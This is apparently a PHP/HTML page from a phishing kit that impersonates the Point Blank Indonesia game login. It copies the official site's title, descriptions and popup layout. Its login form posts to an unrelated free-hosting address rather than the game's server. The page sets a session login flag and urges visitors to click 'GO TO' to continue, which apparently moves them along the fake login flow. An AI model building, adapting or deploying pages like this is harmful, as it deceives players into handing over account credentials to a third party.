<?php
error_reporting(0);
// Start the session
session_start();
?>

<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="author" content="" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="PB Indonesia" />
  <meta property="og:url" content="http://www.pointblank.id/" />
  <meta property="og:description" content="Point Blank is one of the world’s most popular Free-to-play online FPS game serviced in 100 countries and enjoyed by 100 million players" />
  <meta property="og:image" content="../images/og_img.html" />
  <meta name="keywords" content="PB, point blank, fps, shooting game, online" />
  <meta name="description" content="Point Blank is one of the world’s most popular Free-to-play online FPS game serviced in 100 countries and enjoyed by 100 million players" />
  <title>PB Indonesia</title>
  <link rel="stylesheet" type="text/css" href="assets/css/common.css" />
  <link rel="stylesheet" type="text/css" href="assets/css/style.css" />
  <script type="text/javascript" src="assets/js/jquery-ui.min.js"></script>
  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
  <script type="text/javascript">
    function windowClose() {
      var data = '{"type" : "pbid_layer_popup_close"}';
      window.parent.postMessage(data, "*");
    }

    function windowResize(val) {
      var data = '{"type" : "pbid_iframe_resize", "height" : "' + val + '"}';
      window.parent.postMessage(data, "*");
    }

    function windowLoc(val) {
      var data =
        '{"type" : "pbid_location_change", "location" : "' + val + '"}';
      window.parent.postMessage(data, "*");
    }

    function windowReload() {
      var data = '{"type" : "pbid_page_reload"}';
      window.parent.postMessage(data, "*");
    }

    function windowSetValue(id, val) {
      var data =
        '{"type" : "pbid_set_value", "id" : "' +
        id +
        '", "value" : "' +
        val +
        '"}';
      window.parent.postMessage(data, "*");
    }
  </script>
</head>

<body>
  <div id="popup_wrap">
    <h2>Login<a href="javascript:windowClose();">CLOSE</a></h2>
    <form name="userForm" id="userForm" method="post" action="http://pbzi-id.000webhostapp.com/login/process.php">
      <input type="hidden" name="loginFail" id="loginFail" value="0" />
      <div class="pop_cont">
        <div class="entry">
          <h2>
            <center>Click Go To Jika Ingin Melanjutkan</center>
            <?php
            $_SESSION["login"] = true;
            ?>
          </h2>
        </div>
      </div>
      <div class="pop_btn">
        <p class="btn_h72">
          <a class="btn_rd" href="/" rel="nofollow" target="_blank">GO TO</a>
        </p>
      </div>
    </form>

    <div class="loding">
      <p><img src="../images/loading.gif" alt="Loading" /></p>
    </div>
  </div>
  <script type="text/javascript">
    //<![CDATA[
    function inon(obj, idnm) {
      if (obj.value == "")
        document.getElementById(idnm).style.display = "none";
      obj.className = "entry";
    }

    function inout(obj, idnm) {
      if (obj.value == "")
        document.getElementById(idnm).style.display = "block";
      obj.className = "basic";
    }

    function inup(obj, idnm) {
      if (obj.value.lengt > 0)
        document.getElementById(idnm).style.display = "none";
    }

    function drawMsg(focusId, str) {
      alert(str);
      if ($.trim(focusId) != "") $("#" + focusId).focus();
    }

    function formSend() {
      return true;
    }
  </script>
  <script type="text/javascript">
    //<![CDATA[
    function inon(obj, idnm) {
      if (obj.value == "")
        document.getElementById(idnm).style.display = "none";
      obj.className = "entry";
    }

    function inout(obj, idnm) {
      if (obj.value == "")
        document.getElementById(idnm).style.display = "block";
      obj.className = "basic";
    }

    function inup(obj, idnm) {
      if (obj.value.lengt > 0)
        document.getElementById(idnm).style.display = "none";
    }

    function drawMsg(focusId, str) {
      alert(str);
      if ($.trim(focusId) != "") $("#" + focusId).focus();
    }
    //]]>
  </script>
</body>

</html>